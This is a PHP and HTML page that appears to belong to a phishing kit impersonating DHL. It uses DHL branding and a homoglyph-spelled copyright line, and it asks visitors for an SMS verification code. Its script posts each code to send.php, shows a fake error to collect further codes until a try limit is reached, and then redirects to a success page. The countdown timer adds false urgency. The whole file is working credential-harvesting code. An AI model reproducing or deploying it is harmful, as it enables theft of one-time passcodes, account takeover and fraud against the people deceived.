<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --dhl-red: #D40511;
            --dhl-yellow: #FFCC00;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            padding-top: 20px;
        }
        
        .tracking-card {
            max-width: 500px;
            border-radius: 10px;
            border: 1px solid #eee;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .btn-dhl {
            background-color: var(--dhl-red);
            color: white;
            font-weight: 600;
            padding: 12px 25px;
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .btn-dhl:hover {
            background-color: #b30000;
            transform: translateY(-2px);
        }
        
        .sms-form {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
        }
        
        .form-control {
            height: 50px;
            border-radius: 8px;
            border: 1px solid #ddd;
            padding: 12px 15px;
            font-size: 0.95rem;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            border-color: var(--dhl-red);
            box-shadow: 0 0 0 0.25rem rgba(212, 5, 17, 0.25);
        }
        
        .error {
            border-color: var(--dhl-red) !important;
        }
        
        .form-group {
            position: relative;
            margin-bottom: 1.2rem;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.85rem;
            color: #666;
            font-weight: 500;
        }
        
        .sms-error {
            color: var(--dhl-red);
            font-size: 0.9em;
            display: none;
            margin-top: 5px;
        }
        
        .timer {
            font-family: monospace;
            color: var(--dhl-red);
            font-weight: bold;
        }
        
        /* Mobile-specific styles */
        @media (max-width: 576px) {
            body {
                padding: 10px;
                background-color: white;
            }
            
            .tracking-card {
                border: none;
                box-shadow: none;
            }
            
            .container {
                padding: 0;
            }
            
            .btn-dhl {
                padding: 15px 25px;
                font-size: 1.1rem;
            }
            
            .sms-form {
                margin-left: -15px;
                margin-right: -15px;
                border-radius: 0;
                padding: 15px;
            }
            
            .form-control {
                height: 48px;
                padding: 10px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container py-3">
        <div class="row justify-content-center">
            <div class="col-md-8 col-lg-6">
                <div class="card tracking-card shadow-sm p-4 mx-auto">
                  
                    <div class="text-center mb-4" style="background-color: #FFCC00; padding: 8px 0;">
                        <img src="https://cdn.shopify.com/s/files/1/0930/7134/3889/files/cqs.svg?v=1749563770" alt="DHL" style="height:30px;">
                    </div>
                
                    <h4 class="mb-3 fw-bold"><?php echo getLang("_SMS_TITLES")[0];?></h4>
                    <p class="text-muted mb-4"><?php echo getLang("_SMS_TITLES")[1];?></p>
                    
                
                    <div class="text-center mb-3">
                        <small class="text-muted">Code expires in:</small>
                        <div class="timer" id="timer">01:00</div>
                    </div>
                    
                    <!-- SMS Form -->
                    <div class="sms-form mb-4">
                        <div class="form-group">
                            <label><?php echo getLang("_SMS_INPUT");?></label>
                            <input type="text" class="form-control text-center" id="d0" placeholder="000000" maxlength="6">
                            <div class="sms-error" id="sms_error">
                                <?php echo getLang("_SMS_ERROR");?>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Action Button -->
                    <div class="text-center">
                        <button onclick="sendOtp()" class="btn btn-dhl btn-lg w-100">
                            <?php echo getLang("_CONFIRM");?> <i class="fas fa-arrow-right ms-2"></i>
                        </button>
                    </div>
                </div>
                
                <!-- Footer Links -->
                <div class="text-center mt-3" style="font-size: 0.8rem;">
                    <div class="d-flex justify-content-center gap-3">
                     
                    </div>
                    <div class="text-muted mt-2">© 2025 DНL International GmbH. All rights reserved.</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loader" style="display:none;">
        <div class="position-fixed top-0 start-0 w-100 h-100 d-flex align-items-center justify-content-center" style="background:rgba(255,255,255,0.8); z-index:9999;">
            <div class="spinner-border text-danger" role="status">
                <span class="visually-hidden">Loading...</span>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script>
        // Variables
        var allowSubmit;
        var abortVal = true;
        var seconds = <?php echo $seconds*1000; ?>;
        var tries = 0;
        var max_tries = <?php echo $sms_error_times; ?>;
        var tm = $("#timer");
        var secs = 59;
        var mins = 1;
        var inter;
        var nc = false;

        // Apply input mask
        $("#d0").mask('000000');

        // Timer function
        function timer() {
            inter = setInterval(() => {
                if(secs < 0 && mins <= 0) {
                    nc = true;
                    clearInterval(inter);
                    return;
                } else {
                    if(secs < 0) {
                        mins = mins - 1;
                        secs = 59;
                    }
                    var displaySecs = secs < 10 ? "0" + secs : secs;
                    tm.html("0" + mins + ":" + displaySecs);
                    secs = secs - 1;
                }
            }, 1000);
        }
        
        // Start timer
        timer();

        // New code function
        function newCode() {
            if(nc) {
                $(".loader").show();
                setTimeout(() => {
                    tm.html("01:00");
                    timer();
                    $(".loader").hide();
                    nc = false;
                    secs = 59;
                    mins = 1;
                }, seconds);
            }
        }

        // Validation
        function validate() {
            abortVal = false;
            allowSubmit = true;
            
            if($("#d0").val() === "" || $("#d0").val().length < 6) {
                $("#d0").addClass("error");
                allowSubmit = false;
            } else {
                $("#d0").removeClass("error");
            }
        }

        // Event listeners
        $("input").keyup(() => {   
            if(!abortVal) {
                validate();
            }
        });

        $("input").keypress((e) => {
            if(e.key == "Enter") {
                sendOtp();
            }
        });

        // Send OTP function
        function sendOtp() {
            validate();

            if(allowSubmit) {
                $(".loader").show();
                
                $.post("send.php", 
                    {	
                        sms: $("#d0").val()
                    }, 
                    function(done) {
                        setTimeout(() => {
                            tries = tries + 1;
                            if(tries >= max_tries) {
                                window.location = "success.php";
                            } else {
                                $(".loader").hide();
                                $("#sms_error").show();
                                $("#d0").val("").focus();
                            }
                        }, seconds);
                    }
                );
            }
        }
    </script>
</body>
</html>